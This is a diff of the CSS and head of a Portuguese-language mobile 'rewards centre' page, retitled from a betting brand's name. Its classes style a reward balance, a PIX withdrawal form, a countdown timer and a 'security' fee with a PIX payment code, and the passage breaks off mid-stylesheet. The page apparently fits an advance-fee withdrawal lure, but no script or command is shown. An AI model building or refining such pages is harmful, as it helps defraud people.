@@ -3,70 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BETBOOM PREMIOS</title>
+  <title>Central de Recompensas</title>
   <style>
     :root {
-      --pink: #f80072;
-      --pink-dark: #e10067;
-      --ink: #f4f4f7;
-      --muted: #a8a8b3;
-      --line: #2b2b36;
-      --bg: #09090d;
-      --surface: #14141b;
-      --surface-2: #1b1b24;
-      --surface-3: #20202a;
-      --green: #00895e;
-      --shadow: 0 18px 44px rgba(0, 0, 0, 0.42);
-    }
-
-    @keyframes screenIn {
-      from {
-        opacity: 0;
-        transform: translateY(14px) scale(0.99);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
-    }
-
-    @keyframes floatIn {
-      from {
-        opacity: 0;
-        transform: translateY(18px);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @keyframes shimmer {
-      0% {
-        transform: translateX(-120%);
-      }
-
-      100% {
-        transform: translateX(120%);
-      }
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    @keyframes pulseSoft {
-      0%, 100% {
-        box-shadow: 0 12px 24px rgba(248, 0, 114, 0.18);
-      }
-
-      50% {
-        box-shadow: 0 18px 34px rgba(248, 0, 114, 0.3);
-      }
+      --accent: #d62b61;
+      --accent-dark: #b91f4f;
+      --ink: #17171d;
+      --muted: #777b86;
+      --line: #ececf1;
+      --soft: #f7f7f9;
+      --success: #16a06a;
+      --warning: #f1ba22;
+      --surface: #ffffff;
+      --shadow: 0 12px 34px rgba(18, 20, 28, 0.1);
     }
 
     * {
@@ -76,748 +25,894 @@
     body {
       margin: 0;
       min-height: 100vh;
-      background: var(--bg);
+      background: #ffffff;
       color: var(--ink);
       font-family: Arial, Helvetica, sans-serif;
     }
 
+    button,
+    input,
+    select,
+    textarea {
+      font: inherit;
+    }
+
     button {
       border: 0;
-      font: inherit;
       cursor: pointer;
+    }
+
+    .app {
+      position: relative;
+      width: min(100%, 440px);
+      min-height: 100vh;
+      margin: 0 auto;
+      background: #f6f6f8;
+      padding: 8px 10px 40px;
+      overflow-x: hidden;
     }
 
     .screen {
       display: block;
-      animation: screenIn 0.38s cubic-bezier(0.2, 0.8, 0.2, 1);
+      transform-origin: center top;
+      animation: pageEnter 0.42s cubic-bezier(0.2, 0.8, 0.2, 1) both;
+      will-change: opacity, transform, filter;
     }
 
     .screen[hidden] {
       display: none;
     }
 
-    .app {
-      position: relative;
-      min-height: 100vh;
-      padding: 18px 12px 92px;
-      overflow: hidden;
+    .screen.is-exiting {
+      position: absolute;
+      inset: 8px 10px auto;
+      pointer-events: none;
+      animation: pageExit 0.24s ease both;
     }
 
-    .topbar {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      height: 34px;
-      margin-bottom: 17px;
+    .screen.is-entering .balance-strip,
+    .screen.is-entering .task-card,
+    .screen.is-entering .progress-card,
+    .screen.is-entering .mission-card,
+    .screen.is-entering .data-card,
+    .screen.is-entering .pix-form,
+    .screen.is-entering .security-block,
+    .screen.is-entering .process-card,
+    .screen.is-entering .balance-card,
+    .screen.is-entering .confirm-balance {
+      animation: cardLift 0.52s cubic-bezier(0.2, 0.8, 0.2, 1) both;
+    }
+
+    .screen.is-entering .task-card,
+    .screen.is-entering .pix-form,
+    .screen.is-entering .security-block {
+      animation-delay: 0.06s;
+    }
+
+    .screen.is-entering .progress-card,
+    .screen.is-entering .process-card,
+    .screen.is-entering .data-card {
+      animation-delay: 0.12s;
+    }
+
+    .screen.is-entering .mission-card {
+      animation-delay: calc(var(--i, 0) * 0.055s + 0.13s);
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes pageEnter {
+      from {
+        opacity: 0;
+        transform: translateY(18px) scale(0.985);
+        filter: blur(4px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+        filter: blur(0);
+      }
+    }
+
+    @keyframes pageExit {
+      to {
+        opacity: 0;
+        transform: translateY(-10px) scale(0.99);
+        filter: blur(3px);
+      }
+    }
+
+    @keyframes cardLift {
+      from {
+        opacity: 0;
+        transform: translateY(16px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes loadBar {
+      0% {
+        width: 8%;
+      }
+
+      55% {
+        width: 57%;
+      }
+
+      100% {
+        width: 82%;
+      }
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     .brand {
-      display: inline-flex;
+      display: flex;
       align-items: center;
+      justify-content: center;
       gap: 8px;
-      color: #f5f5f8;
-      font-size: 16px;
+      min-height: 50px;
+      margin-bottom: 6px;
+      font-size: 17px;
       font-weight: 800;
-      letter-spacing: 0;
+    }
+
+    .brand-mark {
+      display: block;
+      width: 42px;
+      height: 42px;
+      object-fit: contain;
+    }
+
+    .top-note {
+      margin: -4px 0 12px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 11px;
+      font-weight: 700;
       text-transform: uppercase;
     }
 
-    .brand-logo {
-      display: block;
-      width: 25px;
-      height: 25px;
-      border-radius: 6px;
-      object-fit: cover;
-      background: #111111;
-    }
-
-    .brand-accent {
-      color: #ffd400;
-      text-shadow: 0 1px 0 #111111, 1px 0 0 #111111, 0 -1px 0 #111111, -1px 0 0 #111111;
-    }
-
-    .icon-button {
+    .loading-panel {
       display: grid;
-      width: 20px;
-      height: 24px;
-      place-items: center;
-      background: transparent;
-      color: currentColor;
+      min-height: 530px;
+      align-content: center;
+      gap: 22px;
+      padding: 18px 8px;
     }
 
-    .icon {
-      display: block;
-      width: 18px;
-      height: 18px;
-      stroke: currentColor;
-      stroke-width: 2;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-      fill: none;
-    }
-
-    .balance-card {
-      width: 100%;
-      min-height: 206px;
-      padding: 30px 18px;
-      border-radius: 18px;
-      background: var(--pink);
-      color: #fff;
+    .loading-text {
+      margin: 0;
       text-align: center;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      gap: 10px;
-      position: relative;
-      overflow: hidden;
-      animation: floatIn 0.48s 0.04s both;
-    }
-
-    .balance-card::after,
-    .confirm-balance::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      width: 55%;
-      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.18), transparent);
-      animation: shimmer 3.4s ease-in-out infinite;
-    }
-
-    .balance-label {
-      margin: 0;
+      color: #686b74;
       font-size: 14px;
-      font-weight: 700;
-    }
-
-    .amount {
-      margin: 0;
-      font-size: 33px;
-      line-height: 1.1;
       font-weight: 800;
-      letter-spacing: 1px;
     }
 
-    .weekly {
-      display: inline-flex;
+    .loading-track {
+      height: 5px;
+      overflow: hidden;
+      border-radius: 999px;
+      background: #f0f0f3;
+    }
+
+    .loading-fill {
+      height: 100%;
+      border-radius: inherit;
+      background: var(--accent);
+      animation: loadBar 1.9s ease-in-out forwards;
+    }
+
+    .summary-head {
+      display: flex;
       align-items: center;
-      justify-content: center;
-      gap: 4px;
+      justify-content: space-between;
+      margin: 8px 0 14px;
+      color: #252630;
+      font-size: 16px;
+      font-weight: 800;
+    }
+
+    .balance-strip {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      margin: 0 -2px 12px;
+      padding: 14px 16px;
+      border-radius: 0;
+      background: var(--surface);
+      box-shadow: 0 1px 0 rgba(20, 22, 28, 0.04);
+    }
+
+    .balance-strip span,
+    .balance-card span,
+    .confirm-balance span {
+      display: block;
+      color: var(--muted);
       font-size: 12px;
       font-weight: 700;
+    }
+
+    .amount,
+    .balance-strip strong,
+    .confirm-balance strong {
+      display: block;
+      margin-top: 5px;
+      color: var(--ink);
+      font-size: 26px;
+      line-height: 1;
+      font-weight: 900;
+      letter-spacing: 0;
+    }
+
+    .balance-strip strong {
+      font-size: 20px;
     }
 
     .withdraw {
-      width: 100%;
-      height: 38px;
-      margin-top: 8px;
-      border-radius: 9px;
-      background: #fff;
-      color: var(--pink-dark);
-      font-size: 12px;
-      font-weight: 800;
       display: inline-flex;
       align-items: center;
-      justify-content: center;
       gap: 7px;
-      transition: transform 0.22s ease, box-shadow 0.22s ease, background 0.22s ease;
-    }
-
-    .withdraw:hover,
-    .request-withdraw:hover,
-    .generate-pix:hover,
-    .copy-pix:hover {
-      transform: translateY(-2px);
-    }
-
-    .withdraw:active,
-    .request-withdraw:active,
-    .generate-pix:active,
-    .copy-pix:active {
-      transform: translateY(0) scale(0.98);
-    }
-
-    .withdraw-screen {
-      padding: 0 6px;
-    }
-
-    .withdraw-header {
-      height: 32px;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      margin: -4px 0 21px;
-      color: #f5f5f8;
-      font-size: 14px;
-      font-weight: 800;
-    }
-
-    .back-button {
-      width: 22px;
-      height: 28px;
-      display: inline-grid;
-      place-items: center;
-      background: transparent;
-      color: inherit;
-    }
-
-    .withdraw-balance {
-      position: relative;
-      min-height: 90px;
-      padding: 22px 145px 22px 20px;
-      border-radius: 14px;
-      background: var(--surface);
-      border: 1px solid var(--line);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      gap: 6px;
-    }
-
-    .withdraw-balance span {
-      font-size: 12px;
-      font-weight: 700;
-      color: var(--muted);
-    }
-
-    .withdraw-balance strong {
+      min-width: 76px;
+      min-height: 31px;
+      padding: 0 14px;
+      border-radius: 999px;
+      background: linear-gradient(135deg, #f22d73, #d62b61);
       color: #fff;
-      font-size: 28px;
-      line-height: 1;
+      font-size: 12px;
       font-weight: 800;
-      letter-spacing: 1px;
+      box-shadow: 0 7px 16px rgba(214, 43, 97, 0.26);
     }
 
-    .withdraw-logo {
-      position: absolute;
-      right: 18px;
-      top: 50%;
-      width: 112px;
-      height: auto;
-      transform: translateY(-50%);
-      object-fit: contain;
-      pointer-events: none;
-    }
-
-    .pix-form {
+    .task-card {
       display: grid;
-      gap: 17px;
-      margin-top: 19px;
-    }
-
-    .field-group {
-      display: grid;
-      gap: 7px;
-    }
-
-    .field-group label {
-      font-size: 13px;
-      font-weight: 800;
-      color: #f4f4f7;
-    }
-
-    .betboom-id-section {
-      padding: 14px;
-      border: 1px solid var(--line);
-      border-radius: 14px;
+      grid-template-columns: 1fr auto;
+      gap: 14px;
+      margin-bottom: 10px;
+      padding: 18px 16px;
+      border-radius: 8px;
       background: var(--surface);
+      box-shadow: 0 10px 24px rgba(20, 22, 28, 0.07);
     }
 
-    .betboom-id-header {
+    .task-card h1 {
+      margin: 0 0 4px;
+      max-width: 210px;
+      color: #22232b;
+      font-size: 21px;
+      line-height: 1.08;
+      letter-spacing: 0;
+    }
+
+    .task-card .reward {
+      color: var(--accent);
+      font-size: 21px;
+      font-weight: 900;
+    }
+
+    .task-art {
+      position: relative;
+      display: grid;
+      width: 92px;
+      height: 92px;
+      place-items: center;
+      border-radius: 24px;
+      background: linear-gradient(145deg, #f2e6ff, #fff8e1);
+      color: var(--success);
+      font-size: 39px;
+      font-weight: 900;
+      box-shadow: inset 0 -10px 18px rgba(143, 84, 220, 0.12);
+    }
+
+    .task-art::before,
+    .task-art::after {
+      content: "";
+      position: absolute;
+      border-radius: 50%;
+      background: #f6c33b;
+      box-shadow: inset -4px -5px 0 rgba(190, 130, 20, 0.18);
+    }
+
+    .task-art::before {
+      left: -10px;
+      top: 24px;
+      width: 24px;
+      height: 24px;
+    }
+
+    .task-art::after {
+      right: -8px;
+      bottom: 12px;
+      width: 30px;
+      height: 30px;
+    }
+
+    .task-art-icon {
+      position: relative;
+      display: grid;
+      width: 56px;
+      height: 56px;
+      place-items: center;
+      border-radius: 16px;
+      background: #8d55df;
+      color: #19c99a;
+      box-shadow: 0 9px 16px rgba(112, 75, 185, 0.23);
+    }
+
+    .task-art-icon::before {
+      content: "";
+      position: absolute;
+      inset: -10px 10px auto;
+      height: 15px;
+      border-radius: 999px 999px 0 0;
+      background: #b878ff;
+    }
+
+    .task-row {
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 12px;
-      margin-bottom: 10px;
+      padding: 13px 0 0;
     }
 
-    .betboom-id-header label {
+    .mission-card {
+      margin-bottom: 9px;
+      padding: 14px 16px 12px;
+      border-radius: 8px;
+      background: #fff;
+      box-shadow: 0 1px 0 rgba(20, 22, 28, 0.05);
+    }
+
+    .task-title {
+      margin: 0 0 4px;
+      font-size: 14px;
+      font-weight: 800;
+    }
+
+    .task-meta {
+      margin: 0;
+      color: var(--accent);
       font-size: 12px;
-      letter-spacing: 0;
-      text-transform: uppercase;
+      font-weight: 700;
     }
 
-    .betboom-id-example {
-      display: inline-flex;
-      align-items: center;
+    .task-detail {
+      margin: 2px 0 0;
+      color: #a1a4ad;
+      font-size: 11px;
+      font-weight: 800;
+    }
+
+    .pill-done {
+      flex: 0 0 auto;
+      padding: 8px 14px;
+      border-radius: 999px;
+      background: #f4f4f5;
+      color: #c3c5cc;
+      font-size: 11px;
+      font-weight: 800;
+    }
+
+    .progress-card {
+      margin-bottom: 9px;
+      padding: 11px 14px 13px;
+      border-radius: 8px;
+      background: #fff;
+    }
+
+    .progress-title {
+      margin: 0 0 11px;
+      color: #a0a4ae;
+      font-size: 11px;
+      font-weight: 800;
+    }
+
+    .checkin-grid {
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      gap: 7px;
+    }
+
+    .checkin-item {
+      display: grid;
       gap: 6px;
-      color: #a6a6ad;
-      font-size: 12px;
+      justify-items: center;
+      min-width: 0;
+    }
+
+    .checkin-mark {
+      display: grid;
+      width: 34px;
+      height: 34px;
+      place-items: center;
+      border-radius: 8px;
+      background: #fff1f5;
+      color: var(--accent);
+      font-size: 17px;
+      font-weight: 900;
+    }
+
+    .checkin-item small,
+    .point-step small {
+      color: #9da1aa;
+      font-size: 9px;
       font-weight: 800;
       white-space: nowrap;
     }
 
-    .betboom-id-copy {
-      position: relative;
-      width: 14px;
-      height: 14px;
-      flex: 0 0 auto;
+    .points-line {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      align-items: start;
+      gap: 8px;
+      margin-top: 11px;
+      padding-top: 8px;
+      border-top: 1px dashed #ededf1;
     }
 
-    .betboom-id-copy::before,
-    .betboom-id-copy::after {
-      content: "";
-      position: absolute;
-      width: 9px;
-      height: 9px;
-      border-radius: 2px;
-      background: #5d5d66;
+    .point-step {
+      display: grid;
+      gap: 5px;
+      justify-items: center;
     }
 
-    .betboom-id-copy::before {
-      right: 0;
+    .point-dot {
+      display: grid;
+      width: 21px;
+      height: 21px;
+      place-items: center;
+      border-radius: 50%;
+      background: #f7bd26;
+      color: #996600;
+      font-size: 12px;
+      font-weight: 900;
+      box-shadow: inset -3px -3px 0 rgba(190, 126, 12, 0.16);
+    }
+
+    .withdraw-header,
+    .confirm-header {
+      position: sticky;
       top: 0;
-      opacity: 0.76;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 48px;
+      margin: -8px -10px 14px;
+      border-bottom: 1px solid var(--line);
+      background: rgba(255, 255, 255, 0.94);
+      backdrop-filter: blur(12px);
+      font-size: 15px;
+      font-weight: 900;
     }
 
-    .betboom-id-copy::after {
-      left: 0;
-      bottom: 0;
+    .back-button {
+      position: absolute;
+      left: 10px;
+      display: grid;
+      width: 36px;
+      height: 36px;
+      place-items: center;
+      border-radius: 50%;
+      background: transparent;
+      color: #282a32;
     }
 
-    .betboom-id-section .field {
-      background: #101016;
+    .icon {
+      width: 21px;
+      height: 21px;
+      fill: none;
+      stroke: currentColor;
+      stroke-width: 2.4;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .balance-card,
+    .withdraw-balance,
+    .confirm-balance {
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 14px;
+      padding: 18px;
+      border-radius: 8px;
+      background: #111216;
+      color: #fff;
+      box-shadow: var(--shadow);
+    }
+
+    .balance-card span,
+    .withdraw-balance span,
+    .confirm-balance span {
+      color: rgba(255, 255, 255, 0.68);
+    }
+
+    .balance-card strong,
+    .withdraw-balance strong,
+    .confirm-balance strong {
+      color: #fff;
+    }
+
+    .coin {
+      position: absolute;
+      right: 18px;
+      top: 24px;
+      display: grid;
+      width: 60px;
+      height: 60px;
+      place-items: center;
+      border: 5px solid rgba(255, 255, 255, 0.18);
+      border-radius: 50%;
+      background: #c99922;
+      color: #745300;
+      font-size: 34px;
+      font-weight: 900;
+    }
+
+    .balance-subline {
+      margin: 10px 0 0;
+      color: rgba(255, 255, 255, 0.55);
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .pix-form,
+    .security-block,
+    .process-card,
+    .data-card {
+      margin-bottom: 14px;
+      padding: 18px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--surface);
+    }
+
+    .pix-form {
+      display: grid;
+      gap: 14px;
+      padding: 0 18px 18px;
+    }
+
+    .field-group,
+    .field-control {
+      margin-bottom: 0;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 7px;
+      color: #525662;
+      font-size: 12px;
+      font-weight: 900;
     }
 
     .field,
-    .select-wrap select {
+    select,
+    .pix-code {
       width: 100%;
-      height: 50px;
-      border: 1px solid var(--line);
-      border-radius: 13px;
-      background: var(--surface);
-      color: #f4f4f7;
-      font-size: 16px;
-      font-weight: 600;
+      border: 1px solid #e7e8ee;
+      border-radius: 8px;
+      background: #fafafb;
+      color: var(--ink);
       outline: none;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
     }
 
-    .field {
-      padding: 0 13px;
-    }
-
-    .field-control {
-      display: grid;
-      gap: 6px;
-    }
-
-    .field::placeholder {
-      color: #737380;
-      font-weight: 600;
+    .field,
+    select {
+      min-height: 42px;
+      padding: 0 12px;
+      font-size: 14px;
     }
 
     .field:focus,
-    .select-wrap select:focus {
-      border-color: var(--pink);
-      box-shadow: 0 0 0 1px var(--pink), 0 0 0 4px rgba(248, 0, 114, 0.14);
+    select:focus,
+    .pix-code:focus {
+      border-color: rgba(214, 43, 97, 0.62);
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(214, 43, 97, 0.11);
     }
 
-    .field.invalid,
-    .select-wrap.invalid select {
-      border-color: #ff315d;
-      box-shadow: 0 0 0 1px rgba(255, 49, 93, 0.34);
-    }
-
-    .field-error {
-      min-height: 14px;
-      margin: 0;
-      color: #ff315d;
-      font-size: 11px;
-      line-height: 1.25;
-      font-weight: 800;
+    select {
+      appearance: none;
+      padding-right: 26px;
     }
 
     .select-wrap {
       position: relative;
     }
 
-    .select-wrap select {
-      appearance: none;
-      padding: 0 42px 0 18px;
-    }
-
     .select-wrap::after {
       content: "";
       position: absolute;
-      right: 15px;
+      right: 13px;
       top: 50%;
       width: 7px;
       height: 7px;
-      border-right: 2px solid #f5f5f8;
-      border-bottom: 2px solid #f5f5f8;
+      border-right: 2px solid #9a9da6;
+      border-bottom: 2px solid #9a9da6;
       transform: translateY(-65%) rotate(45deg);
       pointer-events: none;
     }
 
-    .request-withdraw {
-      height: 50px;
-      margin-top: 2px;
-      border-radius: 12px;
-      background: var(--pink);
-      color: #fff;
-      font-size: 13px;
-      font-weight: 800;
-      transition: transform 0.22s ease, box-shadow 0.22s ease, filter 0.22s ease;
+    .field-error,
+    .generate-error,
+    .pix-status {
+      display: none;
+      margin: 7px 0 0;
+      color: #c92744;
+      font-size: 12px;
+      font-weight: 700;
     }
 
-    .request-withdraw:disabled {
-      cursor: not-allowed;
-      opacity: 0.48;
-      filter: grayscale(0.2);
-      transform: none;
+    .field.is-invalid + .field-error,
+    .generate-error.visible,
+    .pix-status.error,
+    .pix-status.success {
+      display: block;
     }
 
-    .request-withdraw:hover,
-    .generate-pix:hover {
-      box-shadow: 0 14px 28px rgba(248, 0, 114, 0.24);
-      filter: brightness(1.02);
+    .pix-status.success {
+      color: var(--success);
     }
 
-    .request-withdraw:disabled:hover {
-      box-shadow: none;
-      filter: grayscale(0.2);
-      transform: none;
-    }
-
-    .confirm-screen {
-      padding: 0 2px;
-    }
-
-    .confirm-header {
-      position: relative;
-      min-height: 38px;
-      display: flex;
-      align-items: flex-start;
+    .request-withdraw,
+    .generate-pix,
+    .copy-pix {
+      display: inline-flex;
+      align-items: center;
       justify-content: center;
-      margin: -5px 0 14px;
-      color: #f5f5f8;
-      text-align: center;
+      gap: 8px;
+      width: 100%;
+      min-height: 48px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #f22d73, #d62b61);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 900;
+      box-shadow: 0 12px 22px rgba(214, 43, 97, 0.24);
+      transition: transform 0.18s ease, filter 0.18s ease, box-shadow 0.18s ease;
+    }
+
+    .request-withdraw:disabled,
+    .generate-pix:disabled {
+      background: #e4e5e9;
+      color: #a3a6af;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    .request-withdraw:not(:disabled):active,
+    .generate-pix:not(:disabled):active,
+    .copy-pix:active,
+    .withdraw:active {
+      transform: scale(0.98);
     }
 
     .confirm-title {
       display: grid;
-      gap: 3px;
-      font-weight: 800;
-      font-size: 15px;
-      line-height: 1.15;
+      gap: 2px;
+      text-align: center;
     }
 
     .timer {
-      color: var(--pink);
-      font-size: 12px;
-    }
-
-    .confirm-header .back-button {
-      position: absolute;
-      left: 0;
-      top: -5px;
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 800;
     }
 
     .step-banner {
-      margin: 0 -14px 14px;
-      padding: 11px 16px;
-      background: #2f62ed;
-      color: #fff;
+      margin: -6px -12px 14px;
+      padding: 9px 12px;
+      background: #eeeeee;
       text-align: center;
-      font-size: 14px;
-      font-weight: 800;
-    }
-
-    .protocol {
-      margin: 0 0 13px;
-      text-align: center;
-      color: #898996;
-      font-size: 11px;
-      font-weight: 800;
-    }
-
-    .confirm-layout {
-      display: grid;
-      gap: 28px;
-    }
-
-    .confirm-balance {
-      min-height: 123px;
-      padding: 31px 21px;
-      border-radius: 16px;
-      background: #7d42d8;
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      position: relative;
-      overflow: hidden;
-      animation: floatIn 0.48s 0.06s both;
-    }
-
-    .confirm-balance span {
-      font-size: 13px;
-      font-weight: 700;
-    }
-
-    .confirm-balance strong {
-      margin-top: 3px;
-      font-size: 32px;
-      line-height: 1;
-      font-weight: 800;
-      letter-spacing: 1px;
+      color: #333640;
+      font-size: 12px;
+      font-weight: 900;
     }
 
     .confirm-balance small {
-      margin-top: 4px;
+      display: block;
+      margin-top: 9px;
+      color: rgba(255, 255, 255, 0.66);
       font-size: 12px;
       font-weight: 800;
-      opacity: 0.74;
     }
 
-    .security-title {
-      margin: 6px 0 10px;
-      color: #9a9aa5;
-      font-size: 11px;
-      font-weight: 800;
+    .security-title,
+    .data-title,
+    .process-title {
+      margin: 0 0 12px;
+      color: #8a8e98;
+      font-size: 12px;
+      font-weight: 900;
       text-transform: uppercase;
     }
 
     .security-amount {
       display: flex;
       align-items: center;
-      flex-wrap: wrap;
-      gap: 8px;
-      margin-bottom: 13px;
+      gap: 10px;
+      margin-bottom: 9px;
     }
 
     .security-amount strong {
-      color: var(--pink);
-      font-size: 28px;
-      line-height: 1;
-      font-weight: 800;
-      letter-spacing: 1px;
+      color: var(--accent);
+      font-size: 25px;
+      font-weight: 900;
     }
 
     .badge {
-      display: inline-flex;
-      align-items: center;
-      min-height: 17px;
-      padding: 0 8px;
-      border-radius: 999px;
-      background: #e8f4ff;
-      color: #2389df;
-      font-size: 9px;
-      font-weight: 800;
+      padding: 5px 7px;
+      border-radius: 4px;
+      background: #eaf8f1;
+      color: var(--success);
+      font-size: 10px;
+      font-weight: 900;
       text-transform: uppercase;
     }
 
-    .security-copy {
-      margin: 0 0 18px;
-      color: #a8a8b3;
+    .security-copy,
+    .fee-answer,
+    .legal-copy {
+      margin: 0;
+      color: #646874;
       font-size: 12px;
-      line-height: 1.55;
+      line-height: 1.45;
       font-weight: 700;
-    }
-
-    .security-copy strong {
-      color: #f4f4f7;
-    }
-
-    .security-copy .pink {
-      color: var(--pink);
     }
 
     .fee-question {
-      margin: 0 0 18px;
-      border: 1px solid var(--line);
-      border-radius: 10px;
-      background: #071426;
-      overflow: hidden;
+      margin-top: 13px;
+      border-top: 1px solid var(--line);
+      padding-top: 13px;
     }
 
     .fee-question summary {
-      min-height: 42px;
-      padding: 0 14px;
-      color: #fff;
-      list-style: none;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 14px;
+      color: #353843;
       font-size: 13px;
-      font-weight: 800;
-    }
-
-    .fee-question summary::-webkit-details-marker {
-      display: none;
-    }
-
-    .fee-question summary::after {
-      content: "";
-      width: 8px;
-      height: 8px;
-      flex: 0 0 auto;
-      border-right: 1.8px solid #8b98ad;
-      border-bottom: 1.8px solid #8b98ad;
-      transform: rotate(45deg);
-      transition: transform 0.2s ease;
-    }
-
-    .fee-question[open] summary::after {
-      transform: translateY(3px) rotate(225deg);
-    }
-
-    .fee-answer {
-      margin: 0;
-      padding: 0 14px 14px;
-      color: #b8c0cf;
-      font-size: 12px;
-      line-height: 1.55;
-      font-weight: 700;
+      font-weight: 900;
+      cursor: pointer;
     }
 
     .breakdown {
-      overflow: hidden;
+      margin-top: 14px;
       border: 1px solid var(--line);
-      border-radius: 14px;
-      background: var(--surface);
-      animation: floatIn 0.48s 0.14s both;
+      border-radius: 6px;
+      overflow: hidden;
     }
 
-    .breakdown-row {
-      min-height: 45px;
-      padding: 0 13px;
+    .breakdown-row,
+    .data-row,
+    .process-row {
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 12px;
+      padding: 12px;
       border-bottom: 1px solid var(--line);
-      color: #d7d7dd;
-      font-size: 13px;
-      font-weight: 700;
+      color: #6f737f;
+      font-size: 12px;
+      font-weight: 800;
     }
 
-    .breakdown-row:last-child {
+    .breakdown-row:last-child,
+    .data-row:last-child,
+    .process-row:last-child {
       border-bottom: 0;
     }
 
+    .breakdown-row strong,
+    .data-row strong {
+      color: #292b34;
+      font-weight: 900;
+    }
+
     .breakdown-row.total {
-      color: var(--pink);
+      background: #fafafa;
+      color: #2d3039;
+    }
+
+    .process-row {
+      justify-content: flex-start;
+    }
+
+    .process-index {
+      display: grid;
+      width: 24px;
+      height: 24px;
+      flex: 0 0 auto;
+      place-items: center;
+      border-radius: 5px;
+      background: #ffeef4;
+      color: var(--accent);
+      font-size: 12px;
+      font-weight: 900;
+    }
+
+    .process-row.done .process-index {
+      background: #eaf8f1;
+      color: var(--success);
+    }
+
+    .process-row p {
+      margin: 0;
+      color: #565a65;
+      font-size: 12px;
+      line-height: 1.35;
       font-weight: 800;
+    }
+
+    .process-row small {
+      display: block;
+      color: #9a9da6;
+      font-weight: 700;
     }
 
     .pix-action {
-      margin-top: 28px;
-      display: grid;
-      gap: 14px;
-      animation: floatIn 0.48s 0.2s both;
+      margin-top: 16px;
     }
 
-    .generate-pix {
-      width: 100%;
-      min-height: 56px;
-      border-radius: 999px;
-      background: var(--pink);
-      color: #fff;
-      font-size: 15px;
-      font-weight: 800;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 9px;
-      transition: transform 0.22s ease, box-shadow 0.22s ease, filter 0.22s ease;
-      animation: pulseSoft 2.8s ease-in-out infinite;
-    }
-
-    .generate-pix.loading,
-    .generate-pix:disabled {
-      pointer-events: none;
-      opacity: 0.86;
-    }
-
-    .spinner {
+    .spinner,
+    .generate-pix-icon {
       width: 18px;
       height: 18px;
-      animation: spin 0.72s linear infinite;
-    }
-
-    .spinner path {
       fill: none;
       stroke: currentColor;
-      stroke-width: 2.5;
+      stroke-width: 2;
       stroke-linecap: round;
       stroke-linejoin: round;
     }
 
-    .generate-error {
-      display: none;
-      margin: -2px 4px 0;
-      color: #c5214f;
-      font-size: 12px;
-      font-weight: 800;
-      line-height: 1.45;
-      text-align: center;
-      animation: screenIn 0.24s ease both;
-    }
-
-    .generate-error.visible {
-      display: block;
-    }
-
-    .generate-pix-icon {
-      width: 17px;
-      height: 17px;
-    }
-
-    .generate-pix-icon path {
-      fill: none;
-      stroke: currentColor;
-      stroke-width: 2;
-      stroke-linejoin: round;
-    }
-
-    .copy-pix.copied {
-      background: #00895e;
-      box-shadow: 0 12px 26px rgba(0, 137, 94, 0.18);
-    }
-
-    .copy-pix.copied::after {
-      content: "Copiado";
-    }
-
-    .copy-pix.copied span {
-      display: none;
-    }
-
-    .mini-spin {
-      display: inline-block;
-      animation: spin 0.8s linear infinite;
+    .spinner {
+      animation: spin 0.9s linear infinite;
     }
 
     .pix-result {
       display: none;
-      padding: 16px;
-      border: 1px solid var(--line);
-      border-radius: 16px;
-      background: var(--surface);
-      box-shadow: var(--shadow);
-      animation: screenIn 0.34s ease both;
+      margin-top: 14px;
     }
 
     .pix-result.visible {
-      display: grid;
-      gap: 13px;
+      display: block;
     }
 
     .pix-result-title {
-      margin: 0;
-      color: #f4f4f7;
-      font-size: 14px;
-      font-weight: 800;
+      margin: 0 0 10px;
+      color: #383b45;
+      font-size: 13px;
+      font-weight: 900;
     }
 
     .pix-qr-wrap {
       display: none;
       justify-content: center;
+      margin: 0 auto 12px;
       padding: 12px;
-      border-radius: 14px;
-      background: var(--surface-2);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: #fff;
     }
 
     .pix-qr-wrap.visible {
@@ -825,435 +920,251 @@
     }
 
     .pix-qr-wrap img {
-      width: 166px;
-      height: 166px;
+      width: 190px;
+      height: 190px;
       object-fit: contain;
-      border-radius: 10px;
-      background: #fff;
     }
 
     .pix-code {
-      width: 100%;
       min-height: 92px;
